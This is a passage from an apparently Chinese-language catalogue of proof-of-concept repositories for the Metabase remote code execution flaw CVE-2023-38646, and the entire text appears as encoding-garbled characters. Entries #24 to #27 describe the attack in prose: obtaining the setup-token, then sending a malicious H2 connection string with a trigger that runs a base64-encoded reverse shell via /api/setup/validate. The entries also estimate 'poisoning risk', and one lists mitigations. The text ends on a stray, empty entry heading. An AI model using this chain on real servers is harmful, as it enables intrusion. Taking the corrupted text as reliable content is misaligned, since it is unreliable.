æä¾›çš„ PoC ä»£ç  `exploit.py` å°è¯•åˆ©ç”¨æ­¤æ¼æ´ã€‚å®ƒé¦–å…ˆè·å– Metabase å®ä¾‹çš„ `setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚Payloadä½¿ç”¨base64ç¼–ç åå¼¹shellå‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š**  PoC è„šæœ¬é¦–å…ˆå‘ç›®æ ‡ Metabase å®ä¾‹çš„ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œè§£æè¿”å›çš„ JSON æ•°æ®ä»¥æå– `setup-token`ã€‚æ­¤ token ç”¨äºåç»­çš„æ¼æ´åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š**  è¯¥è„šæœ¬æ„é€ ä¸€ä¸ª JSON payloadï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT=1` å’Œ `CREATE TRIGGER` ç­‰ H2 ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  **å‘é€ Payloadï¼š**  è„šæœ¬å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨åï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ payload ä¸­çš„å‘½ä»¤ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…çš„æœºå™¨ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

PoC ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå¹¶æ— æ˜æ˜¾çš„æ¶æ„æŠ•æ¯’ä»£ç ï¼Œä½†æ˜¯ä»å­˜åœ¨ä¸€å®šçš„é£é™©, å› ä¸ºPoC æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥æ›¿æ¢åå¼¹shellçš„payloadä¸ºæ¶æ„payload,ä¾‹å¦‚åˆ é™¤æœåŠ¡å™¨æ•°æ®ï¼Œå› æ­¤æŠ•æ¯’é£é™©å­˜åœ¨ï¼Œé¢„ä¼°æ¯”ä¾‹ä¸º5%ã€‚æ­¤è¯„ä¼°åŸºäºä»£ç æœ¬èº«ï¼Œä¸åŒ…æ‹¬ä»£ç æ‰˜ç®¡å¹³å°å¯èƒ½å­˜åœ¨çš„é£é™©ï¼Œå¦‚è´¦å·è¢«ç›—ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [nickswink/CVE-2023-38646](https://github.com/nickswink/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #24

**æ¥æº**: [CVE-2023-38646-passwa11_CVE-2023-38646.md](../2023/CVE-2023-38646-passwa11_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæˆæƒçš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1, < 1.46.6.1 (åŠå…¶ä»–ä¿®å¤ç‰ˆæœ¬è§æ¼æ´åº“ä¿¡æ¯)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚ä¿®å¤ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆé€šè¿‡è®¿é—® `/api/session/properties` ç«¯ç‚¹è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ JSON payloadã€‚è¯¥ payload åˆ©ç”¨ H2 æ•°æ®åº“çš„ä¸€ä¸ªç‰¹æ€§ï¼Œé€šè¿‡åˆ›å»ºè§¦å‘å™¨åœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚è¯¥ JavaScript ä»£ç ä¼šæ‰§è¡Œ bash å‘½ä»¤ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **å‘é€ Payloadï¼š** æ”»å‡»è€…å°†æ„é€ çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚åˆ©ç”¨ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç ï¼Œç»•è¿‡æ£€æµ‹ã€‚

**POC ä»£ç æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç ä¼¼ä¹æœ‰æ•ˆï¼Œå› ä¸ºå®ƒå®ç°äº†ä¸Šè¿°åˆ©ç”¨è¿‡ç¨‹ã€‚å®ƒé¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåŒ…å«åå‘ shell å‘½ä»¤çš„ payloadï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥å­˜å‚¨åº“çš„ä¸»è¦ä»£ç æ–‡ä»¶æ˜¯ `exploit.py`ã€‚ä»”ç»†æ£€æŸ¥æ­¤æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ CVE-2023-38646 æ¼æ´ï¼Œå…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ä½†æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä½œè€…å¦‚æœå°†åå¼¹shellçš„IPæˆ–è€…ç«¯å£å†™æ­»ï¼Œå°±æœ‰å¯èƒ½è¢«ä½œè€…æ§åˆ¶ã€‚
`README.md` æ–‡ä»¶ä»…åŒ…å«æœ‰å…³æ¼æ´å’Œä½¿ç”¨è„šæœ¬çš„è¯´æ˜ã€‚å®ƒè¿˜åŒ…å«å¯¹åŸå§‹æ¼æ´å‘ç°å’Œç›¸å…³æ¼æ´åˆ©ç”¨çš„ credit é“¾æ¥ï¼Œè¿™è¡¨æ˜ä½œè€…æ²¡æœ‰è¯•å›¾éšè—è„šæœ¬çš„ç›®çš„ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [passwa11/CVE-2023-38646](https://github.com/passwa11/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #25

**æ¥æº**: [CVE-2023-38646-securezeron_CVE-2023-38646.md](../2023/CVE-2023-38646-securezeron_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** ç¬¬ä¸€ä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-POC.py`ï¼‰ç”¨äºè·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚å®ƒå°è¯•é€šè¿‡HTTPå’ŒHTTPSè¿æ¥åˆ°ç›®æ ‡IPåœ°å€ï¼Œå¹¶è¯·æ±‚`/api/session/properties`ç«¯ç‚¹ï¼Œè§£æè¿”å›çš„JSONæ•°æ®ï¼Œä»ä¸­æå–`setup-token`ã€‚
2.  **åˆ©ç”¨Setup Tokenæ‰§è¡Œå‘½ä»¤ï¼š** ç¬¬äºŒä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-Reverse-Shell.py`ï¼‰åˆ©ç”¨è·å–åˆ°çš„Setup Tokenï¼Œå‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®ã€‚è¯¥é…ç½®ä½¿ç”¨H2æ•°æ®åº“å¼•æ“ï¼Œå¹¶åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ³¨å…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨`pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œä¹‹å‰è§¦å‘ï¼Œä»è€Œæ‰§è¡ŒBase64ç¼–ç çš„payloadï¼Œpayloadè§£ç åæ‰§è¡Œåå‘shellå‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

ä»æä¾›çš„æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’ŒPOCä»£ç æ¥çœ‹ï¼Œè¯¥æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æœç´¢ç»“æœä¸­åŒ…å«äº†å¤šä¸ªå…³äºæ­¤æ¼æ´çš„æè¿°ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠPOCä»£ç çš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

*   ç¬¬ä¸€ä¸ªè„šæœ¬`CVE-2023-38646-POC.py`åªæ˜¯ç”¨æ¥è·å–setup tokenï¼Œæœ¬èº«ä¸åŒ…å«ä»»ä½•æ¶æ„ä»£ç ã€‚
*   ç¬¬äºŒä¸ªè„šæœ¬`CVE-2023-38646-Reverse-Shell.py`åŒ…å«åå‘shellçš„payloadï¼Œè¿™éƒ¨åˆ†æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆï¼Œä¸èƒ½ç®—ä½œæŠ•æ¯’ä»£ç ã€‚å¯èƒ½çš„æŠ•æ¯’é£é™©åœ¨äºï¼š
    *   **Payloadæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼š** è™½ç„¶å½“å‰Payloadæ˜¯åå‘shellï¼Œä½†æ”»å‡»è€…å¯èƒ½ä¿®æ”¹Payloadï¼Œæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼Œæ¯”å¦‚æ•°æ®çªƒå–ã€å‹’ç´¢è½¯ä»¶ç­‰ã€‚
    *   **ä¾èµ–é¡¹é£é™©ï¼š** è„šæœ¬ä¾èµ–requestsåº“ï¼Œå¦‚æœrequestsåº“æœ¬èº«è¢«æŠ•æ¯’ï¼Œå¯èƒ½å¼•å…¥å®‰å…¨é£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªè„šæœ¬æœ¬èº«ï¼Œæ¯”å¦‚åå‘shell çš„IPåœ°å€ã€ç«¯å£è¢«æ›¿æ¢æˆæ”»å‡»è€…æ§åˆ¶çš„è‚‰é¸¡ä»è€Œè¿›è¡Œè·³æ¿æ”»å‡»ï¼Œä»¥åŠå®‰è£…æ¶æ„ä¾èµ–é¡¹çš„å¯èƒ½ã€‚

æ€»ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯åˆ©ç”¨æœªæˆæƒçš„setupæ¥å£ï¼Œé€šè¿‡æ³¨å…¥æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [securezeron/CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #26

**æ¥æº**: [CVE-2023-38646-threatHNTR_CVE-2023-38646.md](../2023/CVE-2023-38646-threatHNTR_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ PoC ä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† Metabase å®‰è£…è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå³åœ¨è®¾ç½®è¿‡ç¨‹ä¸­å¯ä»¥æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼Œå¹¶ä¸”æœªå¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²è¿›è¡Œå……åˆ†çš„éªŒè¯ã€‚é€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

*   è¯¥PoCé¦–å…ˆè·å– `setup-token` å’Œ Metabase ç‰ˆæœ¬ä¿¡æ¯ã€‚
*   ç„¶åï¼Œå¯¹åŒ…å«åå‘shellå‘½ä»¤çš„payloadè¿›è¡Œbase64ç¼–ç ã€‚
*   æ¥ç€ï¼Œå®ƒæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadï¼Œè¯¥å­—ç¬¦ä¸²åˆ©ç”¨äº†`CREATE TRIGGER` è¯­å¥å’Œå†…åµŒçš„JavaScriptä»£ç æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚
*   æœ€åï¼Œå®ƒå°†æ­¤payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shellåˆ°æ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚

å‚è€ƒæœç´¢ç»“æœ [7] æä¾›äº† GitHub é“¾æ¥ï¼Œè¿›ä¸€æ­¥è¯å®äº† PoC çš„å­˜åœ¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è™½ç„¶PoCæœ¬èº«çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€å®šç¨‹åº¦çš„æŠ•æ¯’é£é™©ã€‚PoCä»£ç ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå¼¹shellçš„IPåœ°å€å’Œç«¯å£ã€‚å¦‚æœæ”»å‡»è€…æ¶æ„ä¿®æ”¹PoCä»£ç ï¼Œä¾‹å¦‚æ·»åŠ é¢å¤–çš„åé—¨æˆ–æ¶æ„åŠŸèƒ½ï¼Œå¹¶å°†å…¶ä¼ æ’­ç»™å…¶ä»–ç”¨æˆ·ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´å¤§èŒƒå›´çš„æ”»å‡»ã€‚é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–ç¬¬ä¸‰æ–¹åº“:** æ£€æŸ¥ PoC ä»£ç ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚
*   **Payloadä¿®æ”¹:** ç”¨æˆ·å¯èƒ½ç›´æ¥ä½¿ç”¨ PoC ä»£ç ï¼Œè€Œä¸æ£€æŸ¥å…¶å†…å®¹ã€‚æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ payloadï¼Œä¾‹å¦‚æ¤å…¥æŒ–çŸ¿ç¨‹åºæˆ–è€…å…¶ä»–æ¶æ„è½¯ä»¶ã€‚
*   **ç¤¾åŒºä¼ æ’­:** ä¿®æ”¹åçš„ PoC ä»£ç å¯èƒ½åœ¨å®‰å…¨ç¤¾åŒºä¸­ä¼ æ’­ï¼Œå¯¼è‡´æ›´å¤šç”¨æˆ·å—åˆ°å½±å“ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å¤§çº¦ä¸º 10%ã€‚è¿™ä¸ªç™¾åˆ†æ¯”å¹¶ä¸é«˜ï¼Œå› ä¸ºå¤§å¤šæ•°å®‰å…¨ç ”ç©¶äººå‘˜ä¼šæ£€æŸ¥ä»£ç åå†ä½¿ç”¨ï¼Œä½†ä»ç„¶éœ€è¦è­¦æƒ•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:**  åˆ©ç”¨ `/api/session/properties` ç«¯ç‚¹è·å– Metabase å®ä¾‹çš„ setup tokenã€‚
2.  **æ„é€ æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²:**  åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE TRIGGER`æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  **å‘é€è¯·æ±‚:**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
4.  **åå¼¹Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œç›®æ ‡ Metabase æœåŠ¡å™¨å°†åå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚
5.  **åˆ©ç”¨æœç´¢ç»“æœ** æœç´¢ç»“æœä¸­æåŠè¯¥æ¼æ´å¯èƒ½è¢«åˆ©ç”¨ (Web Attack: Metabase RCE Vulnerability CVE-2023-38646)ï¼Œå¹¶æä¾›äº†ç¼“è§£æªæ–½ï¼Œè¡¨æ˜è¯¥æ¼æ´åœ¨é‡å¤–å¯èƒ½è¢«åˆ©ç”¨ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   å°† Metabase å‡çº§åˆ°å—å½±å“ç‰ˆæœ¬ä»¥å¤–çš„ç‰ˆæœ¬ (>= 0.46.6.1 æˆ– >= 1.46.6.1)æˆ–å…¶ä»–ä¿®å¤ç‰ˆæœ¬ (0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2)ã€‚


**é¡¹ç›®åœ°å€:** [threatHNTR/CVE-2023-38646](https://github.com/threatHNTR/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #27

**æ¥æº**: [CVE-2023-38646-yxl2001_CVE-2023-38646.md](../2023/CVE-2023-38646-yxl2001_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 and < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Token:** é¦–å…ˆï¼Œåˆ©ç”¨`CVE-2023-38646-POC.py`è„šæœ¬ï¼Œé€šè¿‡è®¿é—®`/api/session/properties`æ¥å£æ¥è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚æ­¤æ­¥éª¤ç”¨äºåˆ¤æ–­ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä»¥åŠè·å–åç»­åˆ©ç”¨æ‰€éœ€çš„tokenã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚:**  ä½¿ç”¨`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬ï¼Œè¯¥è„šæœ¬åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ `pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œï¼Œä»è€Œè§¦å‘ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è„šæœ¬å°†åå¼¹shellçš„bashå‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå°†å…¶æ³¨å…¥åˆ°è§¦å‘å™¨ä¸­ã€‚
3.  **å‘é€ POST è¯·æ±‚:** å°†æ„é€ å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ JSON æ•°æ®é€šè¿‡ POST è¯·æ±‚å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚æ­¤è¯·æ±‚ä½¿ç”¨è·å–çš„ `setup-token` è¿›è¡ŒéªŒè¯ï¼Œå¹¶è§¦å‘ H2 æ•°æ®åº“è¿æ¥ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ POC ä»£ç æœ‰æ•ˆã€‚æœç´¢å¼•æ“ç»“æœä¹Ÿè¡¨æ˜å­˜åœ¨å…¬å¼€çš„ POC å¹¶ä¸”è¯¥æ¼æ´å·²è¢«ç§¯æåˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

`CVE-2023-38646-POC.py` è„šæœ¬åªæ˜¯ç”¨äºè·å– setup tokenï¼Œç›¸å¯¹å®‰å…¨ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ã€‚
`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬æœ¬èº«å®ç°äº†æ¼æ´åˆ©ç”¨ï¼Œä½†ä¸»è¦çš„åŠŸèƒ½æ˜¯å®ç°åå¼¹ shellã€‚ ä»£ç ä¸­å¯¹bashå‘½ä»¤è¿›è¡Œäº†base64ç¼–ç ,ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ä»£ç é˜…è¯»çš„éš¾åº¦ã€‚å­˜åœ¨ä¸€å®šé£é™©ï¼š
    * ç¼–ç å¯èƒ½å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ï¼Œä¾‹å¦‚æ’å…¥é¢å¤–çš„å‘½ä»¤æˆ–ä¿®æ”¹åå¼¹ shell çš„è¡Œä¸ºã€‚å°½ç®¡ç›®å‰ä»£ç çœ‹ä¸Šå»æ˜¯å®ç°æ­£å¸¸çš„åå¼¹shellï¼Œä½†å­˜åœ¨è¢«ç¯¡æ”¹çš„å¯èƒ½æ€§ã€‚ä¾‹å¦‚ï¼Œåœ¨base64ç¼–ç å‰ååŠ å…¥æ¶æ„æŒ‡ä»¤ã€‚
    * è¯¥è„šæœ¬ä¾èµ–äºç›®æ ‡ç³»ç»Ÿä¸Šå­˜åœ¨ bash å’Œ base64 å‘½ä»¤ã€‚è™½ç„¶å¤§å¤šæ•° Linux ç³»ç»Ÿéƒ½åŒ…å«è¿™äº›å‘½ä»¤ï¼Œä½†åœ¨æŸäº›å—é™ç¯å¢ƒä¸­å¯èƒ½ä¸å­˜åœ¨ã€‚ä½œè€…æ¸…æ¥šè¿™ä¸€ç‚¹,ä½†å¹¶æœªå¯¹è¿™ç§æƒ…å†µè¿›è¡Œå¤„ç†,å®¹æ˜“é€ æˆè¯¯åˆ¤.
ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦çš„é£é™©é›†ä¸­åœ¨base64ç¼–ç å†…å®¹å¯èƒ½å­˜åœ¨è¢«ä¿®æ”¹æˆ–æ¤å…¥åé—¨çš„é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [yxl2001/CVE-2023-38646](https://github.com/yxl2001/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---



---

## POC #17

